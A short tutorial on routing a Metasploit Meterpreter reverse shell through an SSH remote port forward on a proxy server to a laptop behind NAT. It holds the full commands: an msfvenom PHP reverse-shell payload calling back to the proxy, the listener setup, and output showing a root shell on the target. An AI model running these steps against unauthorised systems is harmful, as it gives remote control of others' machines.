# Forwarding Meterpreter to your Laptop

Let's say we want to have a reverse shell \(through Meterpreter\), but we don't want to run metasploit on our servers. We want it on our laptop, but unfortunately, it did not have any front-facing public IP. In this article, I will show how to use our server as proxy to connect the reverse shell from our target to our laptop sitting behind NAT.

```bash
# setup ssh tunnel
laptop:$ ssh -R 0.0.0.0:8080:127.0.0.1:1337 -NF user@proxy_server

# listen for meterpreter connection
laptop:$ msfconsole
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set LHOST 127.0.0.1
msf5 exploit(multi/handler) > set LPORT 1337
msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > exploit -j
```

Next let's generate payload and have our target execute it.

```bash
# generate payload
laptop:$ msfvenom -p php/meterpreter_reverse_tcp \
     LHOST=proxy_server \
     LPORT=8080 > payload

# move payload to target server
laptop:$ scp payload.php target:payload.php

# execute payload in target server
target:$ php payload.php
```

Then boom

```bash
msf5 exploit(multi/handler) >
[*] Meterpreter session 1 opened

msf5 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter php/linux  root (0) @ f62342bbe4ce  127.0.0.1:1337 -> 127.0.0.1:51306 (127.0.0.1)

msf5 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 121 created.

whoami
root
```

